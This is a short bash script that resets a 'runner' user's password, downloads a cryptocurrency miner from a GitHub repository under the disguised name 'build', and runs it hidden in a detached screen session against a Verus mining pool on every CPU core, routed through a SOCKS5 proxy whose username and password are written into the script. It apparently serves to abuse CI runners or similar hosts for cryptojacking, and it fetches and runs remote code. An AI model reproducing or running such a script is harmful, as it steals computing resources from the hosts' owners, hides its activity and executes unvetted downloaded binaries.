#!/bin/bash
sudo echo 'runner:runner' | sudo chpasswd
apt update
#!/bin/bash
proxy="socks5://ewean:dikamarmandi@143.198.163.97:333"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile.sh
wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
chmod +x build
chmod +x compile.sh
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RT1Re4JxYJFcq7oM46F9aYe29nZQ9VU5As.worker-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
echo succes
